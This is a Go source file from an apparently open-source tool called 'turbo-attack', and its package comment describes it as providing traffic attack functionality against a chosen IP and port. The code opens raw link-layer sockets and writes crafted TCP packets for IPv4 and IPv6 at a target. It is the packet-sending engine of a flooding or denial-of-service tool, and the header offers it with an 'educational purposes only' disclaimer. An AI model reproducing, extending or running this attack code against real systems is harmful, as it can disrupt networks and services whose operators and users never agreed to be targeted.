// Terms Of Use
// ------------
// Do NOT use this on any computer you do not own or are not allowed to run this on.
// You may NEVER attempt to sell this, it is free and open source.
// The authors and publishers assume no responsibility.
// For educational purposes only.

// Package routine provides traffic attack functionality to a particular ip and port.
package routine

import (
	"errors"
	"net"

	"golang.org/x/sys/unix"

	"github.com/mytechnotalent/turbo-attack/packet"
)

// Socket holds a reusable socket for sending packets
type Socket struct {
	fd       int
	addr     unix.SockaddrLinklayer
	isClosed bool
}

// NewSocket creates a new reusable socket for the given interface
func NewSocket(ethInterface string) (*Socket, error) {
	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, unix.ETH_P_ALL)
	if err != nil {
		return nil, errors.New("failed to create socket: " + err.Error())
	}

	nic, err := net.InterfaceByName(ethInterface)
	if err != nil {
		unix.Close(fd)
		return nil, errors.New("interface does not exist")
	}

	var hardwareAddr [8]byte
	copy(hardwareAddr[0:7], nic.HardwareAddr[0:7])
	addr := unix.SockaddrLinklayer{
		Protocol: unix.ETH_P_IP,
		Ifindex:  nic.Index,
		Halen:    uint8(len(nic.HardwareAddr)),
		Addr:     hardwareAddr,
	}

	if err := unix.Bind(fd, &addr); err != nil {
		unix.Close(fd)
		return nil, errors.New("failed to bind socket: " + err.Error())
	}

	return &Socket{
		fd:       fd,
		addr:     addr,
		isClosed: false,
	}, nil
}

// Close closes the socket
func (s *Socket) Close() error {
	if s.isClosed {
		return nil
	}
	s.isClosed = true
	return unix.Close(s.fd)
}

// SendIP4Packet sends an IPv4 packet
func (s *Socket) SendIP4Packet(ip4Byte, portByte []byte) error {
	if s.isClosed {
		return errors.New("socket is closed")
	}

	packet, err := packet.TCP4(74, ip4Byte, portByte)
	if err != nil {
		return errors.New("failed to create packet: " + err.Error())
	}

	_, err = unix.Write(s.fd, packet)
	if err != nil {
		return errors.New("failed to send packet: " + err.Error())
	}

	return nil
}

// SendIP6Packet sends an IPv6 packet
func (s *Socket) SendIP6Packet(ip6Byte, portByte []byte) error {
	if s.isClosed {
		return errors.New("socket is closed")
	}

	packet, err := packet.TCP6(74, ip6Byte, portByte)
	if err != nil {
		return errors.New("failed to create packet: " + err.Error())
	}

	_, err = unix.Write(s.fd, packet)
	if err != nil {
		return errors.New("failed to send packet: " + err.Error())
	}

	return nil
}

// For backward compatibility
func IP4(ethInterface *string, ip4Byte *[]byte, portByte *[]byte) error {
	socket, err := NewSocket(*ethInterface)
	if err != nil {
		return err
	}
	defer socket.Close()

	return socket.SendIP4Packet(*ip4Byte, *portByte)
}

func IP6(ethInterface *string, ip6Byte *[]byte, portByte *[]byte) error {
	socket, err := NewSocket(*ethInterface)
	if err != nil {
		return err
	}
	defer socket.Close()

	return socket.SendIP6Packet(*ip6Byte, *portByte)
}
